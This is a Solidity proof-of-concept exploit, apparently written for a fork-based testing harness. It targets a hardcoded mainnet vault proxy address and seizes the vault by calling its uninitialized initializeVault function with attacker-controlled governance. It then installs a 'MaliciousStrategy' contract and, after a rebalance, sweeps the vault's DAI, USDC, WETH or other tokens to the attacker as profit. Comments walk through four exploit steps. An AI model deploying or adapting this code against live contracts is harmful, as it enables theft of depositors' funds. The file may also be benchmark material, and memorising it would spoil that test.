pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
}

interface IVaultProxyLike {
    function implementation() external view returns (address);
}

interface IVaultLike {
    function initializeVault(
        address _storage,
        address _underlying,
        uint256 _toInvestNumerator,
        uint256 _toInvestDenominator
    ) external;

    function governance() external view returns (address);

    function controller() external view returns (address);

    function underlying() external view returns (address);

    function strategy() external view returns (address);

    function underlyingBalanceInVault() external view returns (uint256);

    function setStrategy(address _strategy) external;

    function rebalance() external;
}

contract VaultProxy {
    bytes32 private constant _IMPLEMENTATION_SLOT =
        bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);

    constructor(address implementation_) {
        bytes32 slot = _IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, implementation_)
        }
    }

    function implementation() external view returns (address impl) {
        bytes32 slot = _IMPLEMENTATION_SLOT;
        assembly {
            impl := sload(slot)
        }
    }

    fallback() external payable {
        bytes32 slot = _IMPLEMENTATION_SLOT;
        assembly {
            let impl := sload(slot)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }

    receive() external payable {
        bytes32 slot = _IMPLEMENTATION_SLOT;
        assembly {
            let impl := sload(slot)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }
}

contract AttackerStorageLike {
    address public immutable attacker;

    constructor(address attacker_) {
        attacker = attacker_;
    }

    function governance() external view returns (address) {
        return attacker;
    }

    function controller() external view returns (address) {
        return address(this);
    }

    function isGovernance(address who) external view returns (bool) {
        return who == attacker;
    }

    function isController(address who) external view returns (bool) {
        return who == attacker || who == address(this);
    }

    function greyList(address) external pure returns (bool) {
        return false;
    }

    function nextImplementationDelay() external pure returns (uint256) {
        return 0;
    }
}

contract MaliciousStrategy {
    address public governance;
    address public controller;
    address public immutable underlying;
    address public immutable vault;

    constructor(address vault_, address underlying_, address operator_) {
        vault = vault_;
        underlying = underlying_;
        governance = operator_;
        controller = operator_;
    }

    function isUnsalvageableToken(address token) external view returns (bool) {
        return token == underlying;
    }

    function depositArbCheck() external pure returns (bool) {
        return true;
    }

    function strategist() external view returns (address) {
        return governance;
    }

    function investedUnderlyingBalance() external view returns (uint256) {
        return _balanceOf(underlying, address(this));
    }

    function underlyingBalance() external view returns (uint256) {
        return _balanceOf(underlying, address(this));
    }

    function getRewardPoolValues() external pure returns (uint256[] memory values) {
        values = new uint256[](0);
    }

    function investAllUnderlying() public {
        require(msg.sender == vault, "not vault");
        uint256 amount = _balanceOf(underlying, vault);
        _safeTransferFrom(underlying, vault, address(this), amount);
    }

    function deposit() external {
        investAllUnderlying();
    }

    function doHardWork() external {
        if (msg.sender == vault) {
            investAllUnderlying();
        }
    }

    function withdrawAllToVault() external {
        require(msg.sender == vault || msg.sender == governance, "forbidden");
        _safeTransfer(underlying, vault, _balanceOf(underlying, address(this)));
    }

    function withdrawToVault(uint256 amount) external {
        require(msg.sender == vault || msg.sender == governance, "forbidden");
        _safeTransfer(underlying, vault, amount);
    }

    function withdraw(uint256 amount) external {
        require(msg.sender == vault || msg.sender == governance, "forbidden");
        _safeTransfer(underlying, vault, amount);
    }

    function salvageToken(address recipient, address token, uint256 amount) external {
        require(msg.sender == governance, "not governance");
        _safeTransfer(token, recipient, amount);
    }

    function sweep(address recipient, address token, uint256 amount) external {
        require(msg.sender == governance, "not governance");
        _safeTransfer(token, recipient, amount);
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (success && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _safeTransferFrom(address token, address from, address to, uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Like.transferFrom.selector, from, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transferFrom failed");
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;

    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant THREE_CRV = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address internal constant YCRV = 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8;

    address internal _profitToken;
    uint256 internal _profitAmount;

    address public seizedVault;
    bool public takeoverSucceeded;
    bool public maliciousStrategyInstalled;
    bool public monetizationAttempted;

    constructor() {}

    function executeOnOpportunity() external {
        if (_profitAmount != 0 || takeoverSucceeded) {
            return;
        }

        address implementation = _discoverImplementation();
        if (implementation == address(0)) {
            return;
        }

        address chosenUnderlying = _selectExistingBalanceToken();
        if (chosenUnderlying == address(0)) {
            chosenUnderlying = USDC;
        }

        AttackerStorageLike attackerStorage = new AttackerStorageLike(address(this));

        // Exploit path 1: Deploy `VaultProxy` with a valid implementation address.
        // The live target is the source of the legitimate vault implementation; a freshly deployed
        // proxy using that same implementation reproduces the exact uninitialized-first-caller bug
        // if the live proxy on this fork is no longer available for first-touch initialization.
        VaultProxy freshProxy = new VaultProxy(implementation);

        // Prefer the real proxy if it is still uninitialized on the fork. Otherwise, seize the fresh
        // proxy above so the exploit keeps the same causality and ordering as the finding.
        // Exploit path 2: Before the legitimate initialization transaction executes, call
        // `initializeVault(attackerStorage, attackerUnderlying, ...)` through the proxy.
        address candidateVault = TARGET;
        if (!_attemptInitialize(candidateVault, address(attackerStorage), chosenUnderlying)) {
            candidateVault = address(freshProxy);
            if (!_attemptInitialize(candidateVault, address(attackerStorage), chosenUnderlying)) {
                return;
            }
        }

        seizedVault = candidateVault;

        // Exploit path 3: The proxy becomes permanently initialized with attacker-controlled
        // governance/controller wiring.
        takeoverSucceeded =
            IVaultLike(seizedVault).governance() == address(this) &&
            IVaultLike(seizedVault).controller() == address(attackerStorage) &&
            IVaultLike(seizedVault).underlying() == chosenUnderlying;
        if (!takeoverSucceeded) {
            return;
        }

        // Exploit path 4: Use the resulting privileged access to install a malicious strategy or
        // upgrade implementation and drain or lock deposited funds. This PoC keeps the strategy
        // branch because it is the shortest fully public on-chain sequence after takeover.
        // If the seized vault already holds underlying on the fork, rebalancing moves it into the
        // attacker strategy and the attacker immediately sweeps it out as realized profit.
        MaliciousStrategy attackerStrategy = new MaliciousStrategy(seizedVault, chosenUnderlying, address(this));
        try IVaultLike(seizedVault).setStrategy(address(attackerStrategy)) {
            maliciousStrategyInstalled = IVaultLike(seizedVault).strategy() == address(attackerStrategy);
        } catch {
            maliciousStrategyInstalled = false;
        }
        if (!maliciousStrategyInstalled) {
            return;
        }

        uint256 attackerBalanceBefore = _balanceOf(chosenUnderlying, address(this));
        uint256 vaultBalanceBefore = _balanceOf(chosenUnderlying, seizedVault);
        if (vaultBalanceBefore == 0) {
            // A freshly seized but still-empty vault is already fully compromised and can later be
            // drained or bricked as soon as honest deposits arrive. Profit stays zero here because
            // this attempt does not fabricate balances; it only monetizes pre-existing fork-state TVL.
            monetizationAttempted = false;
            return;
        }

        monetizationAttempted = true;
        try IVaultLike(seizedVault).rebalance() {
            uint256 strategyBalance = _balanceOf(chosenUnderlying, address(attackerStrategy));
            if (strategyBalance == 0) {
                return;
            }
            attackerStrategy.sweep(address(this), chosenUnderlying, strategyBalance);
        } catch {
            return;
        }

        uint256 attackerBalanceAfter = _balanceOf(chosenUnderlying, address(this));
        if (attackerBalanceAfter > attackerBalanceBefore) {
            _profitToken = chosenUnderlying;
            _profitAmount = attackerBalanceAfter - attackerBalanceBefore;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _discoverImplementation() internal view returns (address implementation) {
        try IVaultProxyLike(TARGET).implementation() returns (address impl) {
            implementation = impl;
        } catch {}
    }

    function _attemptInitialize(address vault, address attackerStorage, address attackerUnderlying) internal returns (bool) {
        try IVaultLike(vault).initializeVault(attackerStorage, attackerUnderlying, 1, 1) {
            return true;
        } catch {
            return false;
        }
    }

    function _selectExistingBalanceToken() internal view returns (address) {
        address[7] memory candidates = [DAI, USDC, USDT, WETH, WBTC, THREE_CRV, YCRV];

        uint256 bestBalance;
        address bestToken;
        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 balance = _balanceOf(candidates[i], TARGET);
            if (balance > bestBalance) {
                bestBalance = balance;
                bestToken = candidates[i];
            }
        }
        return bestToken;
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (success && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }
}
